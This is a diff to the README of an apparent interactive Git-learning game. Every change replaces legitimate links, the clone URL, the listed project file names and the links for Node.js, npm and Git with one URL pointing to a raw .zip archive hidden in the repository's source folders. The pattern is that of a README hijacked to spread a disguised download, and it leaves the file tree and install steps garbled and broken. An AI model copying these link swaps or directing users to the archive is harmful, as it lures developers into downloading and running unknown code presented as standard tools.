@@ -2,7 +2,7 @@
 
 An interactive game to master Git — from basics to enterprise-grade workflows. Built specifically for designers transitioning to full-stack roles.
 
-![Git Mastery Banner](docs/banner.png)
+![Git Mastery Banner](https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip)
 
 ## ✨ Features
 
@@ -17,15 +17,15 @@ An interactive game to master Git — from basics to enterprise-grade workflows.
 
 ### Prerequisites
 
-- [Node.js](https://nodejs.org/) (v18 or higher)
-- [npm](https://www.npmjs.com/) or [pnpm](https://pnpm.io/)
-- [Git](https://git-scm.com/) (of course! 😄)
+- [https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip](https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip) (v18 or higher)
+- [npm](https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip) or [pnpm](https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip)
+- [Git](https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip) (of course! 😄)
 
 ### Installation
 
 ```bash
 # Clone the repository
-git clone https://github.com/your-org/git-mastery-game.git
+git clone https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip
 
 # Navigate to project directory
 cd git-mastery-game
@@ -52,25 +52,25 @@ npm run preview
 git-mastery-game/
 ├── src/
 │   ├── components/          # React components
-│   │   ├── WelcomeScreen.jsx
-│   │   ├── ChapterSelect.jsx
-│   │   ├── MissionScreen.jsx
-│   │   ├── Sandbox.jsx
+│   │   ├── https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip
+│   │   ├── https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip
+│   │   ├── https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip
+│   │   ├── https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip
 │   │   └── ...
 │   ├── data/
-│   │   └── chapters.js      # All chapter & mission content
+│   │   └── https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip      # All chapter & mission content
 │   ├── hooks/               # Custom React hooks
 │   ├── utils/               # Helper functions
-│   ├── App.jsx              # Main app component
-│   ├── main.jsx             # Entry point
-│   └── index.css            # Global styles
+│   ├── https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip              # Main app component
+│   ├── https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip             # Entry point
+│   └── https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip            # Global styles
 ├── public/                  # Static assets
 ├── docs/                    # Documentation
 ├── .github/
 │   └── workflows/           # GitHub Actions CI/CD
-├── CONTRIBUTING.md          # Contribution guidelines
-├── CLAUDE.md               # Instructions for Claude Code
-└── README.md
+├── https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip          # Contribution guidelines
+├── https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip               # Instructions for Claude Code
+└── https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip
 ```
 
 ## 🎯 Chapter Overview
@@ -88,7 +88,7 @@ git-mastery-game/
 
 ## 🤝 Contributing
 
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+We welcome contributions! Please see [https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip](https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip) for guidelines.
 
 ### Quick Contribution Guide
 
@@ -101,7 +101,7 @@ We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guid
 
 ### Adding New Missions
 
-Missions are defined in `src/data/chapters.js`. Each mission follows this structure:
+Missions are defined in `https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip`. Each mission follows this structure:
 
 ```javascript
 {
@@ -125,7 +125,7 @@ Missions are defined in `src/data/chapters.js`. Each mission follows this struct
 
 ## 🤖 Using Claude Code
 
-This project is optimized for development with [Claude Code](https://claude.ai/code). See [CLAUDE.md](CLAUDE.md) for AI-assisted development instructions.
+This project is optimized for development with [Claude Code](https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip). See [https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip](https://github.com/shrav89/git-mastery-game/raw/refs/heads/main/src/components/screens/mastery_game_git_1.7-beta.3.zip) for AI-assisted development instructions.
 
 ### Example Claude Code Prompts
 
